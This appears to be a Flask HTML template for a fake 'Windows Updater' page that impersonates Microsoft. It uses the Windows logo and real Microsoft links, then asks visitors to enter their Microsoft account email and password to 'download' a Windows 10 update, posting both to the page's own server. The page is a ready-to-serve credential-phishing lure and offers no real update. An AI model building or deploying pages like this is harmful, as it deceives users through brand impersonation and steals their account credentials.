<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Windows Updater</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="{{ url_for('static', filename='win_logo.png') }}" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='main.css') }}" />
</head>
<body>
    <center>
        <img src="{{ url_for('static', filename='win_logo.png') }}" height="250" width="250"> 
        <h1>Windows Updater</h1>
    </center>
    <p><center>Download to update your Windows 10 to the latest Version!<br>
    <span style="color:red">Your Windows will be updated to Windows 10 build 18362.418.</span>
    </p>

    <form action="/download" method="POST">
        <center><input type="text" name="email" placeholder="Microsoft Account Email" class="win-input"></center><br>
        <center><input type="password" name="password" placeholder="Microsoft Account Password" class="win-input"></center><br>
        <center><button class="windows-button">Download Update</button></center><br>
    </form>
    <br><br>

    <h3>Further Reading</h3>
    <p>
        <a href="https://www.microsoft.com/en-us/windows" style="color:dodgerblue">Microsoft Windows Homepage</a>
        <br><br>
        <a href="https://support.microsoft.com/en-us/help/4043948/windows-10-whats-new-in-recent-updates" style="color: dodgerblue">Whats new?</a>
    </p></center>
</body>
</html>
